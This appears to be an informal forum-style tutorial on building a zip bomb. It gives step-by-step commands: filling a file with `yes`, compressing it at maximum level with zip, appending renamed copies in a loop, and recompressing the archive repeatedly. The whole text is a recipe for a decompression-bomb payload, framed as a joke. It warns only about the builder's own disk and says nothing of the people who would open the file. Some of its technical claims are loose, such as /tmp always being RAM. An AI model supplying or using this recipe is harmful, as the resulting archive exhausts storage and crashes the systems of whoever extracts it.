First, create a huge file with a repeating letter with `yes` utility:

```
yes A >> funny0.txt
```

**WARNING!** This will quickly fill up all the available disk space, so be sure to kill the process after a couple of seconds

Next, compress it to the maximum amount, using `zip` utility:

```
zip -9 joke.zip funny0.txt
```

Now, rename funny0.txt and append it to the archive:

```
mv funny0.txt funny1.txt
zip -9g joke.zip funny1.txt
```

Continue doing so until you're satisfied

You can also automate the process of appending to the archive, by running the following script:

```
for i in {1..big_number}; do zip -9g joke.zip funny$i.txt; mv funny$i.txt funny$((i+1)).txt; done
```

Thus, if big_number == 1000 and the size of funny0.txt is 10 GB, then after decompression around 10 TB of space will be wasted, all the while the compressed archive will weight somewhere around 1 GB or maybe even less.

Unless you want to ruin your SSD, don't do this on your main filesystem, better store it in /tmp/ as it's a part of your RAM, however make sure to not run out of it, or else your system might crush

After that, you can compress the zip file again with zip and continiously do so until your zip bomb is the size of the universe

Algorithms with better compression, like xz may yield better results
